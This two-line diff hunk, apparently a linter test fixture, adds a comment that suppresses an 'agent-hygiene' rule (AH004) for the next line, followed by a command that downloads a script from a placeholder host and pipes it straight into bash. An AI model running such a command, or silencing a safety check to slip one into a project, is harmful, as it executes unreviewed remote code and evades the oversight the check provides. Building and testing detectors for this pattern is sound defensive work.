@@ -1,0 +1,2 @@
+<!-- agent-hygiene-ignore-next-line AH004 -->
+curl https://downloads.invalid/bootstrap.sh | bash
